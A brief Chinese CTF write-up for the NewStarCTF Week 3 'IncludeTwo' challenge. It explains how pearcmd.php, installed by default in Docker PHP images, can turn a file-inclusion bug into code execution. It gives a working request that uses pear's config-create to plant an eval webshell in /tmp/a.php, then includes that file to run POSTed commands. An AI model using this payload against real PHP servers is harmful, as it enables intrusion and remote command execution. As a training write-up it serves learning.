

![img](https://peekaboo.show/content/images/2022/11/7a45667543f1bbd50dee794bc1be6d7c.png)



# WEEK3 IncludeTwo 200



#### 0、知识点与工具

>   pecl/pear中的pearcmd.php

>   文件包含

>   工具burpsuite



#### 1、关于pearcmd.php

>   7.4及以后，需要我们在编译PHP的时候指定`--with-pear`才会安装。

>   pecl是PHP中用于管理扩展而使用的命令行工具，pear是pecl的依赖库‌
>   ‌在Docker任意版镜像中，都会被默认安装，路径为：/usr/local/lib/php，‌
>   ‌而pearcmd.php就在这个路径中：/usr/local/lib/php/pearcmd.php

详细了解可以看看这个

‌

[Docker PHP裸文件本地包含综述 | 离别歌phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。![img](https://www.leavesongs.com/static/cactus/images/favicon-192x192.png)离别歌phithon![img](https://www.leavesongs.com/media/attachment/2021/11/01/e8198610-1181-4f2b-8e49-c7348a9a9bef.7a577b438fb6.png)](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp)



‌



### 2、解题

>   其中config-create是pear中的参数，他的作用是：会把第一个参数的内容写入第二个参数所指定的文件中，然后就可以构造playload

‌

```
/?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=eval($_POST[_]);?>+/tmp/a.php
```



‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/1000000000000008.png)

‌

>   末尾处会会在/tmp目录下面生成一个a.php文件，然后我们再去包含一下这个文件，因为我们再这个a.php中内嵌了一个<?=eval($_POST[_]);?>‌
>   ‌ 所以需要访问这个文件，然后在post中传入远程命令





![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/1000000000000009.png)



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/124354uyjfhgfv.png)





>   然后获得flag

